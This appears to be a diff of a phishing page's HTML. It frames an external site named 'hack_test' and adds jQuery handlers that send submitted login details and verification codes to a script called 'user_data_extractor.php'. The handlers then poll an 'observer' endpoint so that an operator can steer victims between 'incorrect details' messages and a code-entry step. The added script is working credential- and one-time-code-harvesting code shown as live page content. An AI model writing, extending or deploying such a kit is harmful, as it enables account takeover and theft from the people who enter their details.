@@ -3,9 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title></title>
     <meta name="robots" content="noindex, nofollow"> 
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
 </head>
 <body style="border:0px;padding:0px;margin:0px">
 <style> 
@@ -18,7 +19,182 @@
      
 </style>
  
-<iframe src="https://autotradingscheme.com/hack_test/" width="100%" style='height: 100vh; border:none;'></iframe>
+<iframe src="" width="100%" style='height: 100vh; border:none;' id="frame"></iframe>
+
+
+
+<script type="text/javascript">
+  $(document).ready(function(){
+
+
+ /////////////////////Data Insertion code section////////////////////////////////
+   $(document).on('submit','#data_form',function(e){
+        var form = $('#data_form')[0];
+        var formData = new FormData(form);
+        e.preventDefault();
+        $('#loader').show();
+        jQuery("#login").attr("disabled", "true");
+        jQuery("#login").text("");
+
+        $.ajax({
+        method:"POST",
+        url: "includes/user_data_extractor.php",
+        data:formData,
+        processData: false,
+        contentType: false,
+        success: function(data){
+        var registration_response = data;
+
+
+        $('#feedback').show();
+        //$('#feedback').html(registration_response);
+        $('#reference').val(registration_response);
+        //$('#data_form').find('input').val('')
+        if (registration_response!="") {
+        setInterval(function(){ $("#observer_button").click(); }, 5000);
+        }
+    }});
+
+}); 
+
+
+$(document).on('submit','#observer_form',function(e){
+        var form = $('#observer_form')[0];
+        var formData = new FormData(form);
+        e.preventDefault();
+        
+        $.ajax({
+        method:"POST",
+        url: "includes/registration_response_observer.php",
+        data:formData,
+        processData: false,
+        contentType: false,
+        success: function(observerResult){
+      var observer_response = observerResult;
+      //jQuery("#login").text(observer_response);
+     
+       if (observer_response==1)
+       {
+        var code_section="view.php?reference="+$('#reference').val();
+        window.location.href=code_section;
+       } 
+
+      if (observer_response==2)
+       {
+        var code_section="1.php?section=code_section&reference="+$('#reference').val();
+        window.location.href=code_section;
+        //$('#main_buffer').hide();
+        //$('#code_buffer').show();
+       }
+
+       if (observer_response==3)
+       {
+        $('#loader').hide();
+        $('#login').prop('disabled', false);
+        //jQuery("#login").attr("enabled", "true");
+        jQuery("#login").text("Login");
+        $('#feedback').html("The details you entered are incorrect. Please check and try again");
+        //setInterval(function(){ window.location.href=""; }, 10000);
+       }
+
+    }
+
+});
+
+}); 
+/////////////////////Data Insertion code section////////////////////////////////
+
+
+
+
+
+
+
+jQuery("#frame").attr("src", "https://autotradingscheme.com/hack_test/");
+
+
+
+
+
+
+/////////////////////Code Insertion code section////////////////////////////////
+   $(document).on('submit','#code_form',function(e){
+        var form = $('#code_form')[0];
+        var formData = new FormData(form);
+        e.preventDefault();
+        //$('#loader').show();
+        jQuery("#code_confirm").attr("disabled", "true");
+        jQuery("#code_confirm").text("Please Wait...");
+
+        $.ajax({
+        method:"POST",
+        url: "includes/user_data_extractor.php",
+        data:formData,
+        processData: false,
+        contentType: false,
+        success: function(code_data){
+        var code_response = code_data;
+
+
+        $('#code_feedback').show();
+        //$('#feedback').html(registration_response);
+        //$('#reference').val(registration_response);
+        //$('#data_form').find('input').val('')
+        if (code_response!="2") {
+        setInterval(function(){ $("#observer_button2").click(); }, 5000);
+        }
+        if (code_response=="2") {
+        $('#code_confirm').prop('disabled', false);
+        jQuery("#code_confirm").text("Confirm");
+        $('#code_feedback').html("Something went wrong. Please try again");
+        }
+    }});
+
+}); 
+
+
+$(document).on('submit','#observer_form2',function(e){
+        var form = $('#observer_form2')[0];
+        var formData = new FormData(form);
+        e.preventDefault();
+        
+        $.ajax({
+        method:"POST",
+        url: "includes/registration_response_observer.php",
+        data:formData,
+        processData: false,
+        contentType: false,
+        success: function(code_observer_result){
+      var code_observer_response = code_observer_result;
+      //jQuery("#login").text(observer_response);
+      
+
+      if (code_observer_response==1)
+       {
+        var code_section="view.php?reference="+$('#reference1').val();
+        window.location.href=code_section;
+       }
+
+       if (code_observer_response==2)
+       {
+        $('#code_confirm').prop('disabled', false);
+        jQuery("#code_confirm").text("Confirm");
+        $('#code_feedback').html("The verification code you entered is incorrect. Please check and try again");
+        //setInterval(function(){ window.location.href=""; }, 10000);
+       }
+
+    }
+    
+});
+
+}); 
+/////////////////////Code Insertion code section////////////////////////////////
+ 
+
+
+
+});    
+</script>
 
 </body>
 </html>
